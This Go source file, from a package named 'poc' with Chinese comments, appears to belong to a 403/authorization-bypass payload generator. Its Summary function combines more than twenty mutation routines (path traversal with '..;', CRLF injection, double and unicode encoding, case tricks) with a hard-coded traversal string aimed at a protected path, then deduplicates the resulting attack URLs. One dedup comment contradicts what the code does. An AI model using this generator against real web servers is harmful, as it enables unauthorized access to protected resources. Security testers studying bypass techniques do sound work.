package poc

import (
	"fmt"
	"net/url"
	"strings"
)

func Summary(noauth, auth string) []string {
	if noauth == "" {
		noauth = "/login"
	}

	list1 := InsertKG(auth)
	list2 := ExtractAndModifyURL(auth)
	list3 := GeneratePaths(noauth, auth)
	list4 := InsertDots(auth)
	list5 := InsertSemicolons(auth)
	list6 := GenerateURLs(auth)
	list7 := ConvertURL(auth)
	list8 := Insertwoe(auth)
	list9 := Insertte(auth)
	list10 := Midg(auth)
	list11 := GFG(auth)
	list12 := Pointgten(auth)
	list13 := Twop(list4)
	list14 := SxS(noauth, auth)
	list15 := "/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;/..;" + auth

	// V2 新增 payload 模块
	list16 := QueryFragment(auth)
	list17 := TabNull(auth)
	list18 := Backslash(auth)
	list19 := DoubleEncode(auth)
	list20 := UnicodeFull(auth)

	// V2.1 新增 payload 模块 (ref: nomore403, 403权限绕过另类思路)
	list21 := SemiTabTraversal(auth)
	list22 := PathCase(auth)
	list23 := CRLFInjection(auth)
	list24 := EndPaths(auth)
	list25 := MidPaths(auth)

	raw := CombineAllLists(
		list1, list2, list3, list4, list5, list6, list7,
		list8, list9, list10, list11, list12, list13, list14,
		list16, list17, list18, list19, list20,
		list21, list22, list23, list24, list25,
		[]string{list15},
	)

	// 两阶段去重：精确去重 + 语义去重
	rawCount := len(raw)
	exact := RemoveDuplicates(raw)
	exactCount := len(exact)
	result := SemanticDedup(exact)
	finalCount := len(result)

	fmt.Printf("[*] Payload 去重: 原始 %d → 精确去重 %d (-%d) → 语义去重 %d (-%d)\n",
		rawCount, exactCount, rawCount-exactCount, finalCount, exactCount-finalCount)

	return result
}

// CombineAllLists 合并任意数量的列表
func CombineAllLists(lists ...[]string) []string {
	combinedList := []string{}
	for _, l := range lists {
		combinedList = append(combinedList, l...)
	}
	return combinedList
}

// RemoveDuplicates 精确字符串去重
func RemoveDuplicates(list []string) []string {
	uniqueMap := make(map[string]bool)
	uniqueList := []string{}

	for _, item := range list {
		if !uniqueMap[item] {
			uniqueMap[item] = true
			uniqueList = append(uniqueList, item)
		}
	}

	return uniqueList
}

// SemanticDedup 语义去重：URL 解码后路径相同的 payload 只保留编码版本
// 例如 /admin%2fadduser 和 /admin/adduser 解码后相同，只保留编码版
func SemanticDedup(list []string) []string {
	type entry struct {
		raw     string
		decoded string
	}

	// 先计算所有 payload 的解码形式
	entries := make([]entry, 0, len(list))
	for _, item := range list {
		decoded, err := url.PathUnescape(item)
		if err != nil {
			decoded = item
		}
		// 进一步规范化：去除连续斜杠、去除尾部斜杠
		decoded = normalizePath(decoded)
		entries = append(entries, entry{raw: item, decoded: decoded})
	}

	// 对于解码后相同的 payload，优先保留编码版本（更长的）
	seen := make(map[string]string) // decoded → 已保留的 raw
	var result []string

	for _, e := range entries {
		existing, exists := seen[e.decoded]
		if !exists {
			seen[e.decoded] = e.raw
			result = append(result, e.raw)
		} else {
			// 如果已存在的是未编码版本，替换为编码版本
			if len(e.raw) > len(existing) && e.raw != e.decoded {
				// 编码版本比纯文本版本更有绕过价值，但已经加入了纯文本版
				// 两者都保留（编码版本可能绕过不同层的检查）
				// 仅当解码后完全相同时才跳过
				continue
			}
		}
	}

	return result
}

// normalizePath 规范化路径用于语义比较
func normalizePath(p string) string {
	// 去除连续斜杠
	for strings.Contains(p, "//") {
		p = strings.ReplaceAll(p, "//", "/")
	}
	// 去除尾部斜杠（保留根路径）
	if len(p) > 1 {
		p = strings.TrimRight(p, "/")
	}
	// 统一大小写用于比较
	return strings.ToLower(p)
}
